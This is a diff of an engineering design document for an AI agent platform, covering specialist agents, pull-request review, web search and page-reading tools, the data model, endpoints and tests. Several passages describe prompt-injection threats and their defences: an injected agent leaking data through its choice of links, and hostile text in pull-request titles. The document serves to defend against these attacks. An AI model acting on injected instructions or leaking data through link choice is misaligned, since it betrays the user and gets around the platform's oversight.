+- **(b)** a result of `web_search`;
+- **(c)** a link on a page `read_page` already returned.
+- Normalising drops `http`/`https`, a leading `www.`, a trailing slash and the fragment. The path and the whole query string must match. The address that is fetched is the one that was seen, not the agent's spelling.
+- **Redirects follow the same rule:** only to a seen address, or to the same address in another spelling. Other redirects are refused, on the same site too.
+- (b) and (c) are kept in Redis per user for 24 hours, at most 500 addresses. (a) is read from the messages when asked.
+- A refusal tells the agent to search first or ask the user for the link. It is written to the activity log (`read_page_refused`) without the query string.
+- **What it does not stop:** a hostile page can offer many links, and an injected agent can signal a few bits by which one it opens. The caps and the rate limit keep that slow.
+- **Known cost:** an automation that reads a fixed page works while the link is in the user's recent messages. After that the agent must search or ask again.
+
 ---
 
 ## 7. Data model
 
-### 7.1 Backend database (26 tables, 9 migrations)
+### 7.1 Backend database (27 tables, 11 migrations)
 
 | Module | Table | Purpose / key columns |
 |---|---|---|
@@ -781,25 +886,26 @@ The per-item checklist (HLD 10.2) is in `docs/security-checklist.md`.
 | channels | `messages` | user_id, channel, direction, text, media_ref, status, event_id, approval_id, client_message_id (unique per user), external_id, session_key |
 | channels | `attachments` | user_id, name, mime_type, size_bytes, path |
 | orchestrator | `sandbox_tokens` | user_id → mcp_token_hash (unique) |
-| orchestrator | `agent_settings` | user_id (PK), runtime (hermes/claude_code, default hermes), claude_connected_at (null = not connected), updated_at. No Claude credential is ever stored |
+| orchestrator | `agent_settings` | user_id (PK), runtime (hermes/claude_code, default hermes), ai_preference (auto/platform, default auto), claude_connected_at (null = not connected), updated_at. No Claude credential is ever stored |
 | orchestrator | `approvals` | user_id, summary, app, action, arguments, status, session_key, expires_at, decided_at/via, used_at |
 | integrations | `connections` | user_id, app, composio_account_id (unique), status, account_label |
 | integrations | `user_mcp_servers` | user_id, name, url, domain, auth_header_name, auth_secret (encrypted), enabled |
 | integrations | `composio_triggers` | user_id, composio_trigger_id, trigger_slug, config. **Not used yet:** app-event automations keep their Composio trigger id in `automations.trigger_ref` |
 | integrations | `byok_keys` | user_id + provider (unique), key (encrypted), last4, model |
-| automations | `automations` | kind, title, instruction, run_at / cron / timezone / trigger + trigger_ref, session_key, enabled, paused_reason, fail_count, next_run_at, last_run_at, completed_at |
+| automations | `automations` | kind, title, instruction, run_at / cron / timezone / trigger + trigger_ref, preset (null or `pr_review`), session_key, enabled, paused_reason, fail_count, next_run_at, last_run_at, completed_at |
+| automations | `pr_reviews` | user_id + owner + repo + pr_number + head_sha (**unique**), automation_id, event_id, status (requested/done/failed). One row per reviewed head commit |
 | billing | `subscriptions` | user_id, plan, polar_subscription_id, status (incl. `cancel_at_period_end`), period_start/end, ended_at |
 | billing | `payments` | polar_order_id, user_id, polar_subscription_id, kind, amount_cents (net), credits bought |
 | billing | `credit_grants` | user_id, source, amount, remaining, expires_at, cheap_model_only, ref |
-| billing | `credit_ledger` | user_id, grant_id, delta, reason, idempotency_key (unique), meta, **UPDATE blocked by trigger** |
-| billing | `usage_periods` | user_id + period_start (unique), period_end, AI cost, awake/browser seconds, credits per kind |
+| billing | `credit_ledger` | user_id, grant_id, delta, reason, idempotency_key (unique), meta (`kind`: `app_action` or `paid_tool`, with the call's cost), **UPDATE blocked by trigger** |
+| billing | `usage_periods` | user_id + period_start (unique), period_end, AI cost, awake/browser seconds, credits per kind (browser time in `browser_credits`) |
 | billing | `litellm_keys` | user_id, key (encrypted), key_alias, models, max_budget, synced spend (total + per model), revoked_at |
 | billing | `coupons` | campaign, credits, max_redemptions, redeemed_count, expires_at, credit_expiry_days, cheap_model_only, new_users_only, plans, active |
 | billing | `coupon_codes` | coupon_id, code_hash (unique), code_prefix, max_redemptions, redeemed_count (per code) |
 | billing | `coupon_redemptions` | coupon_id + user_id (**unique**), ip, grant_id |
-| admin | `audit_log` | user_id, actor (user/agent/admin/system), action, summary, details, credits_charged (set on `run_app_action` entries) |
+| admin | `audit_log` | user_id, actor (user/agent/admin/system), action, summary, details (`crew` on progress lines), credits_charged (set on `run_app_action` and `web_search` entries) |
 
-Migrations: `0000_phase1_core`, `0001_phase3_chat`, `0002_phase4_apps_approvals`, `0003_phase7_automations`, `0004_phase5_billing`, `0005_waitlist`, `0006_pricing_90day_credits_waitlist_offer` (coupon expiry default 90, `waitlist_entries.offer_used_at`), `0007_agent_runtime` (`agent_settings`), `0008_polar_payments` (payment ids renamed for Polar). The launch basics of 2026-10-03 needed no migration.
+Migrations: `0000_phase1_core`, `0001_phase3_chat`, `0002_phase4_apps_approvals`, `0003_phase7_automations`, `0004_phase5_billing`, `0005_waitlist`, `0006_pricing_90day_credits_waitlist_offer` (coupon expiry default 90, `waitlist_entries.offer_used_at`), `0007_agent_runtime` (`agent_settings`), `0008_polar_payments` (payment ids renamed for Polar), `0009_crew_ai_preference_browser_credits` (`usage_periods.browser_credits`, with the old browser credits moved out of `tool_credits`; `agent_settings.ai_preference`), `0010_pr_review` (`pr_reviews`, `automations.preset`). The launch basics of 2026-10-03 needed no migration. Scout's tools needed none either: paid-tool charges are ledger rows and seen addresses are in Redis.
 
 ### 7.2 vm-manager database
 
@@ -812,7 +918,7 @@ Migrations: `0000_phase1_core`, `0001_phase3_chat`, `0002_phase4_apps_approvals`
 
 ## 8. Interfaces
 
-### 8.1 REST endpoints (all 56 operations in `openapi.yaml`)
+### 8.1 REST endpoints (all 60 operations in `openapi.yaml`)
 
 Auth: **public** = no token · **user** = Clerk session · **admin** = Clerk session + admin role.
 
@@ -843,21 +949,25 @@ Auth: **public** = no token · **user** = Clerk session · **admin** = Clerk ses
 | automations | `GET /v1/automations` | user | Automations and reminders |
 | automations | `PATCH /v1/automations/{automationId}` | user | Pause or resume |
 | automations | `DELETE /v1/automations/{automationId}` | user | Delete (timer or trigger too) |
+| automations | `GET /v1/pr-reviews` | user | The GitHub repos that have pull-request review on |
+| automations | `PUT /v1/pr-reviews/{owner}/{repo}` | user | Turn review on for a repo (`409` GitHub not connected, `403 plan_limit`, `400` bad name or GitHub won't let us watch it, `429`) |
+| automations | `DELETE /v1/pr-reviews/{owner}/{repo}` | user | Turn it off (`404` if it wasn't on) |
 | agent | `GET /v1/agent/status` | user | Container state |
-| agent | `GET /v1/agent/settings` | user | Which agent runs (`runtime`, `effectiveRuntime`), what pays (`aiAccess`), Claude plan status, own-key providers |
-| agent | `PATCH /v1/agent/settings` | user | Choose Hermes or Claude Code (`409` without a connected Claude plan) |
+| agent | `GET /v1/agent/settings` | user | Which agent runs (`runtime`, `effectiveRuntime`), what pays (`aiAccess`), whether Textcrew AI is on offer (`platformAvailable`) and chosen (`aiPreference`), Claude plan status, own-key providers |
+| agent | `PATCH /v1/agent/settings` | user | `runtime`, `aiPreference` or both: choose Hermes or Claude Code (`409` without a connected Claude plan), or choose Textcrew AI (`409` when it isn't on offer) |
+| agent | `GET /v1/crew` | user | The crew: Tex and the three specialists, whether each is available, and Scout's browser (needs Max, not built) |
 | agent | `POST /v1/agent/claude/login` | user | Start the Claude Code sign-in in the container; returns Anthropic's URL (10/hour, `503` if unavailable) |
 | agent | `POST /v1/agent/claude/login/{loginId}/complete` | user | Hand over the code from Anthropic's page (`400` wrong/expired, `404` unknown) |
 | agent | `DELETE /v1/agent/claude` | user | Sign Claude Code out; back to Hermes |
-| billing | `GET /v1/billing/plans` | public | Plans and top-up packs |
+| billing | `GET /v1/billing/plans` | public | Plans and top-up packs (`limits.browser` is true on Max, and Max's features name browser use) |
 | billing | `GET /v1/billing/subscription` | user | Current subscription |
 | billing | `POST /v1/billing/checkout` | user | Polar checkout for a plan or top-up |
 | billing | `POST /v1/billing/subscription/cancel` | user | Cancel at period end |
 | credits | `GET /v1/credits` | user | Balance and its grants |
 | credits | `GET /v1/credits/ledger` | user | Credit history |
-| credits | `GET /v1/usage` | user | Usage per period between two dates (AI, awake time, app actions, tools) |
+| credits | `GET /v1/usage` | user | Usage per period between two dates (AI, awake time, app actions, browser time, paid tools) |
 | coupons | `POST /v1/coupons/redeem` | user | Redeem a coupon code |
-| activity | `GET /v1/activity` | user | Audit log of what the agent did (`creditsCharged` on app actions) |
+| activity | `GET /v1/activity` | user | Audit log of what the agent did (`creditsCharged` on app actions and web searches, `crew` on progress lines) |
 | waitlist | `POST /v1/waitlist` | public | Join the waitlist |
 | admin | `GET /v1/admin/coupons` | admin | List coupons |
 | admin | `POST /v1/admin/coupons` | admin | Create a campaign (codes shown once) |
@@ -870,7 +980,7 @@ Auth: **public** = no token · **user** = Clerk session · **admin** = Clerk ses
 
 Pagination: `cursor` + `limit` (1–100, default 30) → `nextCursor` (null at the end). Ids are time-sortable, so lists are ordered by id.
 
-SSE event types on `/v1/stream`: `message.created`, `message.status`, `approval.created`, `approval.resolved`, `agent.status`, `credits.updated`, `automation.updated` (plus `ready` and `ping` every 25 s).
+SSE event types on `/v1/stream`: `message.created`, `message.status`, `approval.created`, `approval.resolved`, `agent.status`, `agent.progress`, `credits.updated`, `automation.updated` (plus `ready` and `ping` every 25 s).
 
 ### 8.2 Webhooks
 
@@ -893,7 +1003,9 @@ The Telegram, WhatsApp and Sendblue webhooks answer 200 and save nothing while t
 | `send_message` | text, session_key? | Message to the user in that chat (default: the last chat they wrote from); only the user's own chats |
 | `get_profile` | – | Name, timezone, plan, connected apps |
 | `list_app_actions` | app?, search? | Actions of connected apps allowed on the plan, with `requires_approval` and `costs_credits` |
-| `run_app_action` | action, arguments, approval_id? | Runs it in Composio as this user; risky ones need a matching approval; a successful action that changes something costs 1 credit (`credits_charged` in the result) |
+| `web_search` | query, count? | Titles, links and snippets from the search provider. A paid tool (cost × 2.5; `credits_charged` in the result). Says so when search isn't set up |
+| `read_page` | url | The text and links of one public web page. Only an address already seen for the user. Free |
+| `run_app_action` | action, arguments, approval_id? | Runs it in Composio as this user; risky ones need a matching approval, except a pull-request comment covered by review being on for that repo; a successful action that changes something costs 1 credit (`credits_charged` in the result) |
 | `request_approval` | summary, action?, arguments?, session_key? | Asks the user; returns `pending`; the agent ends its turn |
 | `schedule_reminder` | text, run_at, session_key? | One-time reminder |
 | `create_automation` | title, instruction, run_at \| cron + timezone \| trigger, session_key? | Automation |
@@ -943,6 +1055,8 @@ All settings come from env vars, validated with Zod at startup (`src/shared/conf
 | Channels | `ENABLED_CHANNELS` (which channels are on; default `telegram,web`), `TELEGRAM_*`, `WHATSAPP_*` (incl. template names), `SENDBLUE_*`, `MEDIA_MAX_BYTES`, `ATTACHMENTS_DIR` |
 | Apps / routing | `COMPOSIO_API_KEY`, `COMPOSIO_WEBHOOK_SECRET`, `COMPOSIO_AUTH_CONFIGS` (JSON slug → auth config id), `JEV_URL`, `JEV_API_KEY`, `JEV_MODEL`, `JEV_TIMEOUT_MS` |
 | AI access | `AI_ACCESS_MODE` (`platform` default: Textcrew AI, Hermes on credits, when the user brings nothing · `own_only`: the user must add a key or connect their Claude plan) |
+| Crew | `CREW_AVAILABLE` (the specialists that are switched on: `byte,patch,scout` by default, or `none`) |
+| Web search | `WEB_SEARCH_PROVIDER` (`brave`), `BRAVE_SEARCH_API_KEY` (unset: `web_search` says it isn't set up), `BRAVE_SEARCH_API_URL`, `WEB_SEARCH_COST_USD` (what one search costs us, default 0.005) |
 | Payments | `POLAR_ACCESS_TOKEN`, `POLAR_WEBHOOK_SECRET`, `POLAR_SERVER` (`sandbox` / `production`), `POLAR_PRODUCT_PRO/MAX/TOPUP_10`, `POLAR_WAITLIST_DISCOUNT_ID`, `FREE_CREDITS_MONTHLY_CAP` |
 | Ops | `BACKUP_DIR`, `BACKUP_VOLUMES_DIR`, `BACKUP_UPLOAD_CMD`, `BACKUP_KEEP_DAYS`, `METRICS_TOKEN`, `ALERT_WEBHOOK_URL`, `RATE_LIMIT_PER_IP_PER_MIN` |
 
@@ -957,10 +1071,10 @@ vm-manager variables (see its `.env.example`): `DATABASE_URL`, `VM_INTERNAL_SECR
 | Harness | `test/global-setup.ts` starts one real Postgres (embedded binaries) and one `redis-server`; `test/setup.ts` gives each test file its own database (all migrations applied) and its own BullMQ key prefix. The global setup also keeps vitest's failure exit code: before 2026-10-03 an exit hook of the embedded Postgres ended the process with 0, so a failing `pnpm test` looked green to CI |
 | Contract | `expectContract(operationId, response, status)` validates every response body against `openapi.yaml`; a test fails if any spec operation isn't implemented |
 | Auth | Test Clerk JWTs signed with a generated RSA key (`CLERK_JWT_KEY`), real `verifyToken` |
-| Outside services | Swappable clients: `setVmClient` (a fake vm-manager whose "agent" calls the real `/mcp` with its token), `setTelegramApi`, `setWhatsappApi`, `setSendblueApi`, `setComposioApi`, `setLiteLLMClient`, `setPolarClient`, `setJevClient`, `setChatCompleter`, `setTranscriber`, `setUrlDownloader`, `setByokVerifier`, `setCommandRunner` |
+| Outside services | Swappable clients: `setVmClient` (a fake vm-manager whose "agent" calls the real `/mcp` with its token), `setTelegramApi`, `setWhatsappApi`, `setSendblueApi`, `setComposioApi`, `setLiteLLMClient`, `setPolarClient`, `setJevClient`, `setChatCompleter`, `setTranscriber`, `setUrlDownloader`, `setByokVerifier`, `setCommandRunner`, `setGitUpstream` (a fake GitHub), `setWebSearchProvider`, `setPageResolver` and `setPageTransport` (a fake internet for `read_page`) |
 | HTTP clients | `phase6-http-clients.test.ts` runs the real HTTP clients against a local stand-in server |
 | Concurrency | 50 parallel coupon redemptions on real Postgres; per-user lock overlap test; parallel sync-usage |
-| Files | `phase1-*` (skeleton), `phase3-*` (Telegram, web), `phase4-*` (approvals, apps), `phase5-*` (credits, usage, coupons, Polar, LiteLLM, jobs, API), `phase6-*` (WhatsApp, Sendblue, media, routing, clients), `phase7-*` (automations), `phase8-*` (hardening), `integration-billing`, `waitlist`, `waitlist-offer`, `claude-plan` (bring your own Claude plan), `git-gateway`, `dev-user-script`, and the launch basics: `channels-switch`, `app-action-charge`, `app-connections`, `telegram-no-purchase-links`, `infra-caddy` (the Caddyfile rule checked against the routes the api mounts) |
+| Files | `phase1-*` (skeleton), `phase3-*` (Telegram, web), `phase4-*` (approvals, apps), `phase5-*` (credits, usage, coupons, Polar, LiteLLM, jobs, API), `phase6-*` (WhatsApp, Sendblue, media, routing, clients), `phase7-*` (automations), `phase8-*` (hardening), `integration-billing`, `waitlist`, `waitlist-offer`, `claude-plan` (bring your own Claude plan), `git-gateway`, `dev-user-script`, and the launch basics: `channels-switch`, `app-action-charge`, `app-connections`, `telegram-no-purchase-links`, `infra-caddy` (the Caddyfile rule checked against the routes the api mounts), and the crew package: `crew`, `textcrew-ai-choice`, `pr-review`, `scout-tools` |
 | vm-manager | Unit tests with a fake Docker daemon and a fake clock; the store on embedded Postgres; the Bridge with a fake Hermes; `-tags=integration` tests for real Docker (not run yet) |
 
 Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · in `vm-manager/`: `go vet ./... && go test ./...`, Bridge: `python3 -m unittest discover -s tests -t .` (in `agent-image/`).
@@ -1005,12 +1119,27 @@ Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · i
 - **No purchase links on Telegram:** only the out-of-credits reply carried one. The sender-side replacement is a safety net for text we don't write (the agent's).
 - **Caddy** answers 404 for `/mcp*` and `/git/*` with a plain-text body. Not tried against a live Caddy.
 
+**Crew package (2026-10-04, `docs/launch-plan.md` W2b-1)**
+- **The crew's availability is a setting** (`CREW_AVAILABLE`), because the backend can't see which agent image is deployed.
+- **Progress lines go to web chat only.** Telegram gets nothing for them. Only lines that name a crew member are saved, at most 30 a turn.
+- **Pull-request review is an automation with a preset,** not a new subsystem: the trigger, the plan limit, pausing and the list come from automations. Only `pr_reviews` is new.
+- **GitHub comments and reviews now need approval** like sending a message. Before, a GitHub comment ran without asking.
+- **The standing permission names four actions exactly.** The first version went by words in the action's name. GitHub has other actions that fit those words (a gist comment, a team discussion comment, a commit comment, a reaction), and with a repo and a pull request number added to their arguments they would have passed. Now an action not on the list needs approval. If Composio names one of the four differently, the review asks for approval: the safe side.
+- **The review instruction carries no text from the pull request.** The first version put the title in it. Anyone who can open a pull request writes the title.
+- **A review that failed is not tried again for that commit,** because a failed turn may already have posted. One the agent never started (out of credits) can be.
+- **Paid tools keep their running total in the ledger** (each charge row saves the call's cost), so there is no counter to drift and no migration.
+- **One search provider is built: Brave.** $5 per 1,000 searches when checked on 2026-10-04, with $5 of free credit a month. Another provider is one more case behind the same interface.
+- **`read_page` opens only an address already seen for the user,** and redirects follow the same rule. This is stricter than the leak needs for redirects (a redirect's target is chosen by the site, not by the agent) and it costs some pages; it can be loosened to "same site" later.
+- **A refused `read_page` is written to the activity log,** so the user can see an injected instruction at work.
+- **Choosing Textcrew AI** is a preference next to the runtime, not a third runtime: the key and the Claude connection stay, so switching back needs no new sign-in.
+- **The browser is a proposal only** (HLD §11): a hosted browser driven by platform tools. Nothing is built.
+
 **vm-manager**
 - **Secrets live in a file on `/data`**, not in env, so a re-created container keeps the same token.
 - **The egress file is removed on every stop**, not only on delete.
 - **SetEgressAllowlist replaces both lists**; the backend sends the MCP domains itself.
 - **No `/data` disk quota** with Docker's default volume driver (set `SANDBOX_VOLUME_DRIVER/OPTS`).
-- **`browser_seconds` is always 0** (nothing records browser time yet). Browser use is planned for launch on the Max plan at 2 credits per minute (Scout drives a real browser); it is designed and built in the crew package and is not built yet.
+- **`browser_seconds` is always 0** (nothing records browser time yet). Browser use is planned for launch on the Max plan at 2 credits per minute (Scout drives a real browser). The crew package wrote a proposal (HLD §11); building it is package W2c and has not started.
 - **Hermes's own approval prompts are denied**; the platform's `request_approval` is used instead.
 
 ---
@@ -1033,6 +1162,12 @@ Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · i
 | 11 | The Caddy rule for `/mcp*` and `/git/*` (2026-10-03) | After a deploy: `curl -i https://<domain>/mcp` and `/git/x/y/info/refs` answer 404 from outside, `/healthz` answers 200, and a turn still works (the container reaches `/mcp` through Squid) |
 | 12 | The connection check against the real Composio (2026-10-03) | Connect an app with `scripts/dev-user.ts connect-app` and no web app: it turns `active` within a minute of approving. Check that `connectedAccounts.list` returns `ACTIVE` for it |
 | 13 | Composio's `readOnlyHint` tag on real tools (2026-10-03) | List a toolkit's tools and check the `tags` field; it only matters for action names with no read or write word |
+| 14 | Pull-request review against the real Composio and GitHub (2026-10-04) | Turn review on for a test repo from the API. Check that `GITHUB_PULL_REQUEST_EVENT` takes `owner` and `repo` and creates the webhook, what its payload looks like (the worker reads `action`, `number` and `pull_request.head.sha`, and asks GitHub for the head commit anyway), and that the four action names in `integrations/catalog.ts` are Composio's real names. If one is wrong, the review asks for approval instead of posting |
+| 15 | A whole review turn (2026-10-04) | Open a pull request in the test repo: Patch clones through the git gateway, posts one review, and the verdict arrives on Telegram. Push again: one more review. Reopen: none |
+| 16 | `web_search` with a real Brave key (2026-10-04) | Set `BRAVE_SEARCH_API_KEY`, ask the agent to search, and check the results, the 1-credit charge and the `Web search` line in the credit history |
+| 17 | `read_page` against the real internet (2026-10-04) | Read an https page named in a message; check the pinned connection works with real certificates, a compressed page, and a page that redirects from `http` to `https`. From outside nothing changes: the tool is only reachable through `/mcp` |
+| 18 | Crew progress lines from the real Bridge (2026-10-04) | With the W2b-2 agent image: start a job that uses a specialist and watch `agent.progress` on `/v1/stream`; nothing extra arrives on Telegram |
+| 19 | Scout's tool limit on Hermes (2026-10-04) | On Hermes the limit is an instruction, not a tool list. Check what a delegated Scout can call, and that `read_page` refuses a made-up address whoever calls it |
 
 Most likely to break on the first real run:
 - Hermes config keys and its run API
@@ -1041,6 +1176,8 @@ Most likely to break on the first real run:
 - LiteLLM's key `aliases` and `/spend/logs` filter
 - WhatsApp template setup (one body variable; approval template buttons in Approve, Reject order)
 - The Claude Code sign-in screen parsing in the pseudo-terminal, and the exact CLI flags of the pinned version
+- Composio's GitHub trigger payload and action names (pull-request review)
+- Pages that redirect to another path: `read_page` refuses those unless the target was seen
 
 ---
 
@@ -1055,11 +1192,11 @@ beckend/
     auth/                     users, sessions, link codes, channel links, waitlist
     events/                   intake, queues, cleanup
     channels/                 adapters (telegram, whatsapp, sendblue, web), messages, outbound, SSE, media, files
-    orchestrator/             turn flow, process-message, Jev routing, approvals, sandbox tokens, lifecycle, gRPC client, lock, agent settings + Claude sign-in
-    platform-mcp/             MCP server + tools (core, apps, automations)
-    integrations/             Composio catalog/client/connections, user MCP servers, BYOK
-    billing/                  plans, credits/ledger, usage, LiteLLM, Polar, coupons, jobs
-    automations/              automations + jobs
+    orchestrator/             turn flow, process-message, Jev routing, approvals, sandbox tokens, lifecycle, gRPC client, lock, agent settings + Claude sign-in, the crew list
+    platform-mcp/             MCP server + tools (core, apps, automations, web), seen web addresses
+    integrations/             Composio catalog/client/connections, user MCP servers, BYOK, git gateway, web page reader, web search
+    billing/                  plans, credits/ledger, usage, app-action and paid-tool charges, LiteLLM, Polar, coupons, jobs
+    automations/              automations + jobs, pull-request review
     admin/                    audit, alerts, metrics, health, backup
   src/shared/                 config, db, redis, crypto, errors, ids, logger, rate limits
   src/wiring.ts               connects modules through their hooks
